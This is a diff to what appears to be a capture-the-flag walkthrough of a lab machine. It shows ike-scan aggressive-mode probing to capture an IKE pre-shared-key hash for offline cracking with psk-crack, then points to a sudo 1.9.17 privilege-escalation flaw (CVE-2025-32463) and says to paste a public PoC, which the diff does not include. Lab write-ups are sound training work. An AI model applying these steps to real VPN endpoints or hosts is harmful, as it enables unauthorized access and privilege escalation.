@@ -70,24 +70,43 @@ sudo ike-scan -A 10.129.211.69
 ```
 
 ```
-10.129.211.69 Aggressive Mode Handshake returned
-  SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK ...)
+Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.129.211.69 Aggressive Mode Handshake returned HDR=(CKY-R=a9ba19488d0dd2f6)
+  SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
+  KeyExchange(128 bytes) Nonce(32 bytes)
   ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
+  VID=09002689dfd6b712 (XAUTH)
+  VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
   Hash(20 bytes)
+
+Ending ike-scan 1.9.5: 1 hosts scanned in 0.017 seconds (60.36 hosts/sec).
+1 returned handshake; 0 returned notify
 ```
 
-Key info: identity is `ike@expressway.htb`, auth is PSK. Now capture the full handshake hash by specifying the identity:
+We observe the peer identity: `ike@expressway.htb`. Now run a targeted scan with that identity to capture the full PSK handshake hash:
 
 ```bash
 sudo ike-scan -A -P ike@expressway.htb 10.129.211.69
 ```
 
 ```
+Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.129.211.69 Aggressive Mode Handshake returned HDR=(CKY-R=99a2e5a5558973ca)
+  SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
+  KeyExchange(128 bytes) Nonce(32 bytes)
+  ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
+  VID=09002689dfd6b712 (XAUTH)
+  VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
+  Hash(20 bytes)
+
 IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
-<hash blob saved to file>
+<IKE_PSK_HASH_REDACTED>
+
+Ending ike-scan 1.9.5: 1 hosts scanned in 0.017 seconds (60.52 hosts/sec).
+1 returned handshake; 0 returned notify
 ```
 
-The hash blob is suitable for offline PSK cracking with `psk-crack`.
+We successfully captured the IKE PSK handshake hash ready for cracking. Save the hash and crack it. Note: use **psk-crack**, not hashcat or John — the format is specific to ISAKMP aggressive mode and is incompatible with standard password hash formats.
 
 ### Crack the PSK
 
@@ -128,7 +147,7 @@ sudo --version
 Sudo version 1.9.17
 ```
 
-Search for known vulnerabilities. Sudo 1.9.17 is affected by **CVE-2025-32463** — a local privilege escalation flaw. A public PoC is available.
+Sudo reports version 1.9.17. Search for public advisories affecting this version — **CVE-2025-32463** is a local privilege escalation vulnerability in sudo 1.9.17, with a public PoC available.
 
 ```bash
 nano exploit.sh   # paste the PoC
